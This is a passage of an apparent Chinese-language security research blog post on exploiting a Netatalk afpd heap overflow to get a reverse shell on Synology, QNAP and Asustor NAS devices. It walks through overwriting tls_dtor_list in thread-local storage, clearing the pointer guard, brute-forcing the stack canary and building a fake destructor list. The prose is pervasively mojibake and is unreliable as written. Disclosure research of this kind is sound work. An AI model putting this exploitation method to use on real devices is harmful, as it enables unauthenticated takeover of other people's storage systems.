&lt;p&gt;Âõ†ÁÇ∫ÊòØ‰ª• mmap ÂàÜÈÖçÁöÑÈóú‰øÇÔºåÊúÄÂæåÂàÜÈÖçÂá∫‰æÜÁöÑÁ©∫ÈñìÂâáÊúÉÂú® Thread Local Storage ÂçÄÊÆµ‰∏äÈù¢ÔºåËÄå‰∏çÊòØÂú®Ê≠£Â∏∏ÁöÑ heap segment ‰∏äÔºåÂ¶Ç‰∏äÂúñÁöÑÁ¥ÖÊ°ÜËôï„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afpd ÁöÑ memory layout Â¶Ç‰∏äÂúñÊâÄÁ§∫Ôºå‰∏äËø∞Á¥ÖÊ°ÜÈÇ£Â°äÂ∞±ÊòØÔºåÁ¥ÖËâ≤+Ê©òËâ≤ÈÄôÂçÄÊÆµÔºåÂú® command buffer ‰∏ãÊñπÁöÑÊòØ Thread-local Storage„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage(TLS) ÊòØÁî®‰æÜÂ≠òÊîæ thread ÁöÑÂçÄÂüüËÆäÊï∏ÔºåÊØèÂÄã thread ÈÉΩÊúÉÊúâËá™Â∑±ÁöÑ TLSÔºåÂú® Thread Âª∫Á´ãÊôÇÂ∞±ÊúÉÂàÜÈÖçÔºåÁï∂ Thread ÁµêÊùüÁöÑÊôÇÂÄôÂ∞±ÊúÉÈáãÊîæÔºåËÄå main thread ÁöÑ TLS ÂâáÊúÉÂú® Process Âª∫Á´ãÊôÇÂ∞±ÊúÉÂàÜÈÖçÔºåÂ¶ÇÂâçÈù¢ÂúñÁâá‰∏≠ÁöÑÊ©òËâ≤ÂçÄÊÆµÔºåÂõ†Ê≠§ÊàëÂÄëÂèØÂà©Áî® heap overflow ÁöÑÊºèÊ¥û‰æÜË¶ÜËìãÊéâÂ§ßÈÉ®ÂàÜÂ≠òÊîæÂú® TLS ‰∏äÁöÑËÆäÊï∏„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;‰∫ãÂØ¶‰∏ä‰æÜË™™ TLS ÂèØÊéßÂà∂ RIP ÁöÑËÆäÊï∏Êúâ‰∏çÂ∞ëÔºåÈÄôÈÇäÊèêÂá∫ÂπæÂÄãÊØîËºÉÂ∏∏Ë¶ãÁöÑ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Á¨¨‰∏ÄÂÄãÊòØ main arenaÔºå‰∏ªË¶ÅÊòØ glibc Ë®òÊÜ∂È´îÁÆ°ÁêÜÂÄãÁµêÊßãÔºåÊîπ main arena ÂèØ‰ª•ËÆìË®òÊÜ∂È´îÂàÜÈÖçÂà∞‰ªªÊÑèË®òÊÜ∂È´î‰ΩçÁΩÆÔºåÂÅö‰ªªÊÑèÂØ´ÂÖ•Ôºå‰ΩÜÊßãÈÄ†‰∏äÊØîËºÉÈ∫ªÁÖ©„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á¨¨‰∫åÂÄãÊòØ pointer guard ÂèØËóâÁî±‰øÆÊîπ pointer guard ‰æÜÊîπËÆäÂéüÊú¨ÂëºÂè´ÁöÑ function pointer Ôºå‰ΩÜÈÄôÈÇäÈúÄË¶ÅÂÖàÊúâ leak Ë∑üÁü•ÈÅìÂéüÊú¨ pointer guard ÁöÑÂÄºÊâçËÉΩÈÅîÊàê&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á¨¨‰∏âÂÄãÂâáÊòØÊîπ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; Ôºå‰∏çÈ†à leak ÊØîËºÉÁ¨¶ÂêàÊàëÂÄëÁèæÂú®ÁöÑÁãÄÊ≥Å&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;ÈÄôÊäÄÂ∑ßÊòØÁî± project zero Âú® 2014 ÊâÄÊèêÂá∫ÁöÑ&lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;ÊñπÊ≥ï&lt;/a&gt;ÔºåË¶ÜËìã TLS ‰∏äÁöÑ tls_dtor_list ‰æÜÂÅöÂà©Áî®ÔºåËóâÁî±Ë¶ÜËìãË©≤ËÆäÊï∏ÂèØÂú®Á®ãÂºèÁµêÊùüÊôÇÊéßÂà∂Á®ãÂºèÊµÅÁ®ã„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÈÇäÂ∞±Á®çÂæÆÊèê‰∏Ä‰∏ãÈÄôÂÄãÊñπÊ≥ïÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÊòØÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; object ÁöÑ singly linked list ‰∏ªË¶ÅÊòØÂ≠òÊîæ thread local storage ÁöÑ destructorÔºåÂú® thread ÁµêÊùüÊôÇÊúÉÂéªÁúãÈÄôÂÄã linked list ‰∏¶ÂéªÂëºÂè´ destructor functionÔºåÊàëÂÄëÂèØËóâÁî±Ë¶ÜËìã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÊåáÂêëÊàëÂÄëÊâÄÊßãÈÄ†ÁöÑ dtor_list„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÁï∂Á®ãÂºèÁµêÊùüÂëºÂè´ exit() ÊôÇÔºåÊúÉÂéªÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt; ÔºåË©≤ function ÊúÉÂéªÂèñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ‰∏≠ÁöÑ object ‰∏¶ÂéªÂëºÂè´ÊØèÂÄã destructorÔºåÊ≠§ÊôÇÂ¶ÇÊûúÊàëÂÄëÂèØ‰ª•ÊéßÂà∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; Â∞±ÊúÉÂéª‰ΩøÁî®ÊàëÂÄëÊâÄÊßãÈÄ†ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; ‰æÜÂëºÂè´ÊàëÂÄëÊåáÂÆöÁöÑÂáΩÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂú®Êñ∞ÁâàÊú¨Âíå synology ÁöÑ libc ‰∏≠Ôºådtor_list ÁöÑ function pointer ÊúâË¢´ pointer guard ‰øùË≠∑ÔºåÂ∞éËá¥Ê≠£Â∏∏ÊÉÖÊ≥Å‰∏ãÔºåÊàëÂÄë‰∏¶‰∏çÂ•ΩÂà©Áî®Ôºå‰∏ÄÊ®£ÈúÄË¶ÅÂÖà leak Âá∫ pointer guard ÊâçËÉΩÂ•ΩÂ•ΩÊéßÂà∂ rip Âà∞ÊàëÂÄëÊÉ≥Ë¶ÅÁöÑ‰ΩçÁΩÆ‰∏ä„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊúâË∂£ÁöÑÊòØ pointer guard ‰πüÊúÉÂú® TLS ‰∏äÔºå‰ªñÊúÉÂ≠òÂú®  TLS ‰∏≠ÁöÑ tcbhead_t ÁµêÊßã‰∏≠ÔºåÂ¶ÇÊûúÊàëÂÄë overflow Â§†Â§öÔºå‰πüÂèØ‰ª•Âú® overflow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÁöÑÂêåÊôÇÔºå‰πüÂ∞á pointer guard ‰πü‰∏Ä‰ΩµÊ∏ÖÊéâÔºåÈÄôÊ®£Â∞±ÂèØ‰ª•ËÆìÊàëÂÄë‰∏çÁî®ËôïÁêÜ pointer guard ÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÖà‰æÜË¨õË¨õ tcbhead_t ÈÄôÁµêÊßãÔºåÈÄôÂÄãÁµêÊßã‰∏ªË¶ÅÊòØ Thread Control Block (TCB)ÔºåÊúâÈªûÈ°û‰ºº Windows ‰∏≠ÁöÑ TEB ÁµêÊßã ÊòØ thread ÁöÑ descriptorÔºå‰∏ªË¶ÅÊúÉÁî®‰æÜÂ≠òÊîæ thread ÁöÑÂêÑÁ®ÆË≥áË®äÔºåËÄåÂú® x86_64 ÁöÑ Linux Êû∂ÊßãÁöÑ usermode ‰∏ãÔºåfs Êö´Â≠òÂô®ÊúÉÊåáÂêëÈÄô‰ΩçÁΩÆÔºåÊØèÁï∂ÊàëÂÄëË¶ÅÂ≠òÂèñ thread local variable ÊôÇÔºåÈÉΩÊúÉÈÄèÈÅé fs Êö´Â≠òÂô®Âéª Â≠òÂèñÔºåÊàëÂÄëÂèØ‰ª•ÁúãÂà∞ TCB ÁµêÊßãÊúÉÊúâ stack guard Âèä pointer guard Á≠âË≥áË®äÔºå‰πüÂ∞±ÊòØË™™Áï∂ÊàëÂÄëÂú®Êãø pointer guard ÊôÇÔºå‰πüÊòØÁî® fs Êö´Â≠òÂô®ÂæûÈÄôÂÄãÁµêÊßãÂèñÂá∫ÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂõûÈ†≠Áúã‰∏Ä‰∏ã TLS ‰∏äÁöÑÁµêÊßãÂàÜ‰ΩàÔºåÂèØ‰ª•ÁúãÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÂæåÊñπÂ∞±ÊòØÈÄôÂÄãÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; ÁµêÊßã„ÄÇÂè™Ë¶ÅÊàëÂÄë overflow Â§†Â§öÂ∞±ÂèØ‰ª•ËìãÊéâ pointer guardÔºåÁÑ∂ËÄåÊ≠§ÊôÇÊúÉÂá∫ÁèæÂè¶Â§ñ‰∏ÄÂÄãÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âõ†ÁÇ∫ stack guard Âú® pointer guard ÂâçÔºåÁï∂ÊàëÂÄëËìãÊéâ pointer guard ÁöÑÂêåÊôÇÔºå‰πüÊúÉËìãÊéâ stack guard„ÄÇÈÇ£È∫ºËìãÊéâ stack guard ÊúÉÊúâ‰ªÄÈ∫ºÂΩ±ÈüøÂë¢Ôºü&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÊàëÂÄëÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; ÊôÇÔºåÂõ†ÁÇ∫ÊúâÈñãÂïü stack guard ‰øùË≠∑ÁöÑÈóú‰øÇÔºåÊúÉÂÖàÂæû TLS ‰∏äÔºåÂèñÂæó stack guard ÊîæÂú® stack ‰∏äÔºåÁ≠âÂà∞ÊàëÂÄëÂëºÂè´ dsi_stream_read Âéª trigger overflow ‰∏îËìãÊéâ pointer guard Âèä stack guard ÂæåÔºåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; ËøîÂõûÊôÇÔºåÊúÉÂéªÊ™¢Êü• stack guard ÊòØÂê¶Ëàá TLS ‰∏≠ÁöÑÁõ∏ÂêåÔºå‰ΩÜÂõ†ÁÇ∫ÈÄôÊôÇÂÄôÁöÑ TLS ÁöÑ stack guard Â∑≤Á∂ìË¢´ÊàëÂÄëËìãÊéâ‰∫ÜÔºåÂ∞éËá¥Ê™¢Êü•‰∏çÈÄöÈÅéËÄå‰∏≠Ê≠¢Á®ãÂºèÔºåÂ∞±ÊúÉÈÄ†ÊàêÊàëÂÄëÁÑ°Ê≥ïÂà©Áî®ÈÄôÂÄãÊäÄÂ∑ß‰æÜÈÅîÊàê RCE„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® netatalk(afpd) ÁöÑÊû∂Êßã‰∏≠Ôºå‰∫ãÂØ¶‰∏äÊØèÊ¨°ÈÄ£Á∑öÈÉΩÊúÉ fork ‰∏ÄÂÄãÊñ∞ÁöÑ process ‰æÜ handle ‰ΩøÁî®ËÄÖÁöÑ requestÔºåËÄå Linux ‰∏≠ÁöÑ process ÊúâÂÄãÁâπÊÄßÊòØ fork Âá∫‰æÜÁöÑ processÔºåmemory address Âèä stack gurad Á≠âÈÉΩÊúÉËàáÂéüÂÖàÁöÑ parent process Áõ∏ÂêåÔºåÂõ†Ê≠§ÊàëÂÄëÂèØ‰ª•Âà©Áî® CTF Â∏∏Ë¶ãÁöÑÊãõÂºèÔºå‰∏ÄÂÄã byte ‰∏ÄÂÄã bytes  brute-force ÁöÑÊñπÂºè‰æÜÁç≤Âæó stack guard „ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

&lt;p&gt;Âü∫Êú¨Ê¶ÇÂøµÊòØ Âú® overflow ‰πãÂæåÔºåÊàëÂÄëÂèØ‰ª•Âè™Ëìã TLS ‰∏≠ÁöÑ stack guard ÊúÄÂ∞æÁ´Ø‰∏ÄÂÄã byte ÔºåÊØèÊ¨°ÈÄ£Á∑öÈÉΩËìã‰∏çÂêåÁöÑ byteÔºå‰∏ÄÊó¶Ëàá stack guard ‰∏çÂêåÔºåÂ∞±ÊúÉÂõ†ÁÇ∫ abort ËÄå‰∏≠Êñ∑ÈÄ£Á∑öÔºåÊàëÂÄëÂèØ‰æùÊìöÈÄ£Á∑öÁöÑ‰∏≠Êñ∑ËàáÂê¶ÔºåÂà§Êñ∑ÊàëÂÄëÊâÄË¶ÜËìãÁöÑÊï∏ÂÄºÊòØÂê¶Ëàá stack guard Áõ∏Âêå„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ª•‰∏äÂúñ‰æÜË™™ÔºåÊàëÂÄëÂÅáË®≠ stack guard ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;ÔºåÁî±Êñº stack guard ÁâπÊÄßÔºåÊúÄ‰Ωé‰∏ÄÂÄã byte ‰∏ÄÂÆöÊúÉÊòØ 0 ÔºåÈÄôÈÇäÂæûÁ¨¨‰∫åÂÄã byte ËìãËµ∑ÔºåÈÄôÈÇäÂèØ‰ª•ÂÖàËìã 00 Ë©¶ÁúãÁúãÈÄ£Á∑öÊòØÂê¶Ë¢´‰∏≠Êñ∑ÔºåÂ¶ÇÊûúË¢´‰∏≠Êñ∑‰ª£Ë°®ËìãÁöÑÊï∏ÂÄºÊòØÈåØÁöÑÔºåÊé•‰∏ã‰æÜÊàëÂÄëÂ∞±Ê∏¨ÂÖ∂‰ªñÊï∏ÂÄºÁúãÁúãÊúâÊ≤íÊúâ‰∏≠Êñ∑Ôºå‰æùÊ≠§È°ûÊé®ÔºåÊ∏¨Âà∞ 0xbc ÁôºÁèæÊ≤íÊúâ‰∏≠Êñ∑Ôºå‰ª£Ë°®Á¨¨‰∫åÂÄã byte ÊòØ 0xbcÔºåÊé•‰∏ã‰æÜÂ∞±ÁπºÁ∫åËìãÁ¨¨‰∏â byte Ôºå‰∏ÄÊ®£Âæû 0x00 ËìãÂà∞Ê≤í‰∏≠Êñ∑ÔºåÁõ¥Âà∞ËìãÊªø 8 bytes ÁöÑ stack guard ÈÉΩÊ≤í‰∏≠Êñ∑ÈÄ£Á∑öÂæåÔºåÊàëÂÄëÂ∞±ÂèØ‰ª•Áü•ÈÅì stack guard ÁöÑÂÄºÊòØ‰ªÄÈ∫ºÔºåÊé•‰∏ã‰æÜÊàëÂÄëÂ∞±ÂèØ‰ª•Ëß£Ê±∫ stack guard ÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

&lt;p&gt;Âú®Ëß£Ê±∫ stack guard ÂïèÈ°åÂæåÔºånetatalk Â∑≤ÂèØÊ≠£Â∏∏ÈÅã‰ΩúÔºåÊé•‰∏ã‰æÜÊàëÂÄëÈúÄË¶ÅÊßãÈÄ† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; ÁµêÊßã‰∏¶ÁµêÊùüÁ®ãÂºè‰æÜÊéßÂà∂ RIPÔºåÂú®Áï∂ÊôÇÁöÑ synology ÁöÑ afpd ‰∏≠‰∏¶Ê≤íÊúâÈñãÂïü PIEÔºåÊàëÂÄëÂèØ‰ª•Âú® afpd ÁöÑ data ÊÆµ‰∏≠ÔºåÊßãÈÄ† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂâõÂ•ΩÂú®‰ΩøÁî® dhx2 method ÁöÑ login ÂäüËÉΩ‰∏≠ÔºåÊúÉÂ∞áÊàëÂÄëË¶ÅÁôªÂÖ•ÁöÑ username Ë§áË£ΩÂà∞ global ÁöÑ buffer ‰∏≠ÔºåÊâÄ‰ª•ÊàëÂÄëÂèØ‰ª•Â∞áÈÄôÁµêÊßãË∑üËëó username ‰∏ÄËµ∑ÂØ´ÂÖ•Âõ∫ÂÆöÁöÑÂ∑≤Áü•‰ΩçÁΩÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®‰∏ÄÂàáÈÉΩÊßãÈÄ†ÂÆåÊàêÂæåÔºåÊàëÂÄëÈÄôÈÇäÂèØ‰ª•Ëß∏ÁôºÊ≠£Â∏∏ÂäüËÉΩÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; Âç≥ÂèØËß∏Áôº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit()&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® reverse ÂæåÔºåÁôºÁèæ synology ÁöÑ glibc ‰∏≠ÔºåÊúÉ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr()&lt;/code&gt; ‰æÜÂèñÂæó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;Ôºå‰∏¶ÈùûÁõ¥Êé•Â≠òÂèñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÈÄôÂÄãÂÖ®ÂüüËÆäÊï∏ÔºåËÄåÈÄôÂáΩÂºèÁöÑÂèñÂæóÊñπÂºèÂâáÊúÉÂæûÂâçËø∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; ‰∏≠ÂÖàÂèñ div Ê¨Ñ‰ΩçÂæåÔºåÂÜçÂèñÂæóÂÖ∂‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ÔºåÂõ†Ê≠§ÊàëÂÄëÈúÄË¶ÅÈÄ£Âêå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt; ‰∏ÄËµ∑ÊßãÈÄ†Âú®Âõ∫ÂÆö‰ΩçÁΩÆÔºåÂè¶Â§ñ‰∏ÄÈªûÊòØ Synology ÁöÑ afpd ‰∏≠‰∏¶Ê≤íÊúâ system ÂèØÁî®Ôºå‰ΩÜ‰∫ãÂØ¶‰∏äÊúâ execl ÂèØ‰ª•‰ΩøÁî®ÔºåÂè™ÊòØÂèÉÊï∏Á®çÂæÆË§áÈõú‰∏ÄÈªûËÄåÂ∑≤„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÊàëÂÄëÊßãÈÄ†ÁöÑÁµêÊßãÂ¶Ç‰∏äÂúñÊâÄÁ§∫ÔºåÊàëÂÄëÂ∞á tcb Âèä dtor_list ÁµêÊßãÈÉΩÊßãÈÄ†Âú® username buffer ‰∏≠ÔºåËß∏Áôº exit() ÂæåÔºåÂ∞±ÊúÉÂéªÂü∑Ë°å execl ‰∏¶ÂèñÂæóÂèçÈÄ£ shell„ÄÇ&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;

&lt;p&gt;Âú®‰∏ÄËà¨ÁöÑ Netatalk ‰∏≠ÔºåÊòØÊúÉÂïüÁî® PIE Ôºå‰∏çÂ§™ÂÆπÊòìÂú®Â∑≤Áü•‰ΩçÁΩÆÊßãÈÄ† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;ÔºåÂØ¶Èöõ‰∏ä‰πüÂèØ‰ª•Áî®È°û‰ººÊñπÊ≥ï leak Âá∫ libc ‰ΩçÁΩÆÔºå‰æùËàäÊòØ exploitableÔºåË©≤ÊºèÊ¥û‰∏çÂè™ÂΩ±Èüø Synology ‰πüÊúÉÂΩ±ÈüøÂà∞Â§ßÈÉ®ÂàÜÊúâ‰ΩøÁî® Netatalk ÁöÑË®≠ÂÇô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÊ∏¨Ë©¶‰∫ÜË®±Â§öÂÆ∂Êúâ‰ΩøÁî®Âà∞ Netatalk ÁöÑÂª†ÂïÜÔºåÁôºÁèæ‰∏çÂ∞ëÂÆ∂ÊúâÂ≠òÂú®È°û‰ººÁöÑÂïèÈ°åÔºåÈÉ®ÂàÜÊòØ unexploitable ‰ΩÜ‰πüÊúâÈÉ®ÂàÜÊòØ exploitable„ÄÇÊàëÂÄëÈÄôÈÇäÂØ¶Ê∏¨‰∫Ü QNAP Âèä AsustorÔºåÁöÜÊúâÊàêÂäüÁç≤Âæó shell„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖßÂª∫ system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖßÂª∫ system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;QNAP Âèä Asustor ÂÖ©ÂÆ∂ NAS ÈÉΩÊ≤íÊúâÈñãÂïü Stack guardÔºå‰∏çÈúÄ brute-force Âç≥ÂèØÁç≤ÂæóÂèçÈÄ£ shell„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄãÊºèÊ¥ûÂú® Synology Â∞öÊú™‰øÆË£úÊôÇÔºåÂè™Ë¶Å default Ë£ùÂ•ΩÂ∞±ÂèØ‰ª•Âà©Áî®Ôºå&lt;strong&gt;‰∏çÈúÄ‰ªª‰ΩïË™çË≠â&lt;/strong&gt;ÔºåËÄå QNAP Âèä Asustor ÈõñÁÑ∂‰∏çÊòØÈ†êË®≠ÈñãÂïüÔºå‰ΩÜ‰∏çÂ∞ëÊúâ‰ΩøÁî® Mac ÁöÑÁî®Êà∂ÔºåÈÇÑÊòØÊúÉÁÇ∫‰∫ÜÊñπ‰æøÊääÂÆÉÊâìÈñãÔºåÂü∫Êú¨‰∏äÂè™Ë¶ÅÊòØ NAS Âπæ‰πéÈÉΩÊúÉÁî®Âà∞ NetatalkÔºåÁµïÂ§ßÂ§öÊï∏ÁöÑ NAS ÈÉΩÊúâÂΩ±ÈüøÔºåÂè™Ë¶ÅÊúâÈñãÂïü NetatalkÔºåÊîªÊìäËÄÖÂèØ‰ª•Âà©Áî®ÈÄôÂÄãÊºèÊ¥ûÊâì‰∏ãÂ§ßÈÉ®ÂàÜÁöÑ NAS„ÄÇ&lt;strong&gt;‰Ω†ÁöÑ NAS Â∞±ÂÜç‰πü‰∏çÊúÉÊòØ‰Ω†ÁöÑ NAS„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

